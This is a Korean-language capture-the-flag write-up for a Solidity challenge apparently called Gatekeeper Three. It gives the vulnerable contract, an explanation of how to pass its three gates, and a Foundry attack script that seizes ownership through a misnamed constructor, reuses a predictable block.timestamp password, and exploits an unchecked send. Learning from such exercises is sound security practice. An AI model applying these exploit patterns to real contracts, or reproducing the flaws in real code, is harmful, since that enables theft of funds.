# 지문

게이트들을 극복하고 \*\*참가자(entrant)\*\*가 되세요.

도움이 될 만한 것들:

* 저수준(low-level) 함수들의 반환 값을 기억하세요.
* 의미(semantic)에 주의를 기울이세요.
* 이더리움에서 \*\*스토리지(storage)\*\*가 어떻게 동작하는지 복습하세요.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

# 풀이 

`gateOne`, `gateTwo`, `gateThree` 조건을 충족시키면됨.

`gateOne`은 contract를 올려서 `construct0r`함수를 호출하면됨.
`gateTwo`는 올린 contract에서 `createTrick`함수를 호출하면됨. 이렇게 되면 `SimpleTrick`함수 안의 password는 현 시점의 `block.timestamp`이기때문에 이것도 `getAllowance`함수를 추가호출해줘서 해결함
`gateThree`는 문제 contract로 0.001 ether보다 큰 Native Token을 보내고, owner가된 contract에 따로 receive/fallback handler를 작성해주지않음으로써 해결할 수 있었음

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
    function enter() external;
    function trick() external view returns (address);
    function owner() external view returns (address);
}

interface ITrick {
    function checkPassword(uint256 _password) external returns (bool);
}

contract AttackContract {
    ITarget public target;
    
    constructor(address _target) {
        target = ITarget(_target);
    }

    function completeAttack() external payable {
        target.construct0r();

        target.createTrick();

        target.getAllowance(block.timestamp);

        payable(address(target)).transfer(0.002 ether);
        target.enter();
    }
}

contract SolveScript is Script {
    address public target = 0xBf5A316F4303e13aE92c56D2D8C9F7629bEF5c6e;
    AttackContract public attacker;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        
        // Deploy attack contract
        attacker = new AttackContract(target);
        console.log("Attack contract deployed at:", address(attacker));
        
        // Execute complete attack in one transaction
        attacker.completeAttack{value: 0.002 ether}();
        
        console.log("Attack completed successfully!");
        console.log("New owner:", ITarget(target).owner());
        
        vm.stopBroadcast();
    }
}
```